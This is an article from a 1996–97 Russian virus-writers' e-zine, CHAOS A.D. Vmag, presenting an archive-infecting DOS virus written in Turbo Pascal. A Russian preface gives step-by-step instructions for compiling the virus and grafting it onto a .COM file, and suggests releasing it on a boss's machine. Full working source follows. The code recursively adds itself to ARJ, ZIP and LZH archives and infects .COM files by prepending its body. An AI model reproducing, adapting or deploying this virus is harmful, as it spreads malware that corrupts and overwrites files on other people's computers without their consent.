{

[Death Virii Crew] Presents
CHAOS A.D. Vmag, Issue 3, Autumn 1996 - Winter 1997


			     Вирус-Архивирус.


******************************************************************************
                     ПРИВЕТ читающая публика !!!
    		Идущий на смерть приветствует тебя !!!!!!
******************************************************************************
Смотрел я тут как вы упражняетесь в написании виров, да и думаю:"не накорябать
ли мне чего-нибудь". Подумано-сделано... Из-за слабого знания ассемблера, и из
-за отсутствия свободного времени для того что-бы изучить вышеупомянутый язык
низкого уровня, написал я сей вир на Паскакале. Да-да.. Не смейтесь. Это произ
ведение прошло только пока лабораторные испытания. Но на них показало свою жив
учесть должным уровнем. Не знаю, хранят ли простые юзверя еще на винте свои ли
чные архивы али нет, но смысл действий таков: Заражается какой нибудь комок,
при запуске сего комка происходит ЕГО архивирование в первые попавшиеся архивы
!!! С перезаписью !!! Делаем свою резервную копию... Потом когда-нибудь, какой-
нибудь юзверь разархивирует и запустит оный продукт - "наша песня хороша-начин
ай сначала !!!"
для распространения или просто ради ознакомления в живом виде рекомендую:
1. Откомпилировать.
2. Сжать какой-нибудь сжималкой.
3. Просмотреть размер.
4. Этот размер присвоить MySize.
5. Повторить пп.1,2. (в тосности !!!)
6. Взять какой-нибудь комок и привить ему вирус Досовской командой типа:
           copy /b virarh.exe+имякомка.сом gggggggg.com
7. Запустить где-нибудь. Не обязательно на своей машине ;). Лучше всего-
   для полигона использовать машину начхальника.

                                            Ну вот и все...
                                            С уважением
                                            
                                               BiG Mazzy,
                                                        I like eat Clock !
P.S. Текст даного вира можно изменять(в лучшую сторону разумеется) по своему
усмотрению.
******************************************************************************
}

{$M 10000,0,300000}
uses Dos;
Const
    MySize:Word=7136;
Var sc,i:Byte;
    MyBodyD,FFBodyD:pointer;
    MyBodyF:File;
    FFBodyF:File;
    FFSize:Integer;
    MZ:Char;
    curdisk,curdir,Com_Line:String;

Procedure Alldir(dir:PathStr);
Var
  FFBodFF,FFBodAA,FFBodBB,FFBodCC:File;
  SR:SearchRec;
  T,extt:String;
  i:Byte;
  FilePol:String;
  Dir_:DirStr;
  Name_:NameStr;
  Ext_:ExtStr;
Begin
  Dir:=dir+'\';
  FindFirst(Dir+'*.*',AnyFile,SR);
  While DosError=0 Do
    With SR Do Begin
       FilePol:=Concat(Dir,Name);
       FSplit(FilePol,Dir_,Name_,Ext_);
       IF (Ext_='.ARJ') and (sc<5) Then begin
          SwapVectors;
          exec(GetEnv('COMSPEC'),'/c arj a -y'+filepol+' '+paramStr(0)+' >NUL');
          SwapVectors;
          sc:=sc+1;
       end;
       IF (Ext_='.ZIP') and (sc<5) Then begin
          SwapVectors;
          exec(GetEnv('COMSPEC'),'/c pkzip '+filepol+' '+paramStr(0)+' >NUL');
          SwapVectors;
          sc:=sc+1
       end;
       IF (Ext_='.LZH') and (sc<5) Then begin
          SwapVectors;
          exec(GetEnv('COMSPEC'),'/c lha a'+filepol+' '+paramStr(0)+' >NUL');
          SwapVectors;
          sc:=sc+1
       end;
       IF (Ext_='.COM') and (sc<5) Then begin
          if (sr.size<(65000-MySize)) and ((Name_+Ext_)<>'COMMAND.COM')
          then begin
          assign(FFBodAA,filepol);
          reset(FFBodAA,1);
          blockread(FFBodAA,MZ,1);
          close(FFBodAA);
          if MZ<>'M' then begin
              SwapVectors;
              exec(GetEnv('COMSPEC'),'/c cd '+CurDISK+COPY(dir,1,LENGTH(dir)-1)+' >nul');
              SwapVectors;
              assign(FFBodFF,'nc.ini');
              rewrite(FFBodFF,1);
              blockwrite(FFBodFF,MyBodyD^,MySize);
              Close(FFBodFF);
              SwapVectors;
              exec(GetEnv('COMSPEC'),'/c copy /b nc.ini+'+name_+ext_+' dn.cfg'+' >nul');
              SwapVectors;

              SwapVectors;
              exec(GetEnv('COMSPEC'),'/c del '+name_+ext_+' >nul');
              SwapVectors;
              SwapVectors;
              exec(GetEnv('COMSPEC'),'/c ren dn.cfg '+name_+ext_+' >nul');
              SwapVectors;
              erase(FFBodFF);
              sc:=sc+1
          end;

          end;
       end;

       FindNext(SR);
    End;
  FindFirst(Dir+'*.*',Directory,SR);
  While DosError=0 Do
   With SR Do begin
     if (Name[1]<>'.') and (Attr=Directory) then Alldir(Dir+Name);
     FindNext(SR);
   End;
End;
Begin
   GetDir(0,curdir);
   CurDisk:=copy(curdir,1,2);
   iF ParamCount>0 Then
   Begin
      For i:=1 To ParamCount Do
      Com_Line:=Com_Line+' '+paramstr(i);
   End;
   Sc:=0;
   assign(MyBodyF,paramstr(0));
   reset(MyBodyF,1);
   getmem(MyBodyD,MySize);
   blockread(MyBodyF,MyBodyD^,MySize);
   seek(MyBodyF,MySize);
   FFSize:=filesize(MyBodyF)-MySize;
   getmem(FFBodyD,FFSize);
   blockread(MyBodyF,FFBodyD^,FFSize);
   assign(FFBodyF,'bmbmbmbm.com');
   rewrite(FFBodyF,1);
   blockwrite(FFBodyF,FFBodyD^,FFSize);
   freemem(FFBodyD,FFSize);
   close(MyBodyF);
   close(FFBodyF);
   swapvectors;
   exec(GetEnv('COMSPEC'),'/c bmbmbmbm.com '+Com_Line);
   swapvectors;
   erase(FFBodyF);
   Alldir('');
   freemem(MyBodyD,MySize);
End.

******************************************************************************
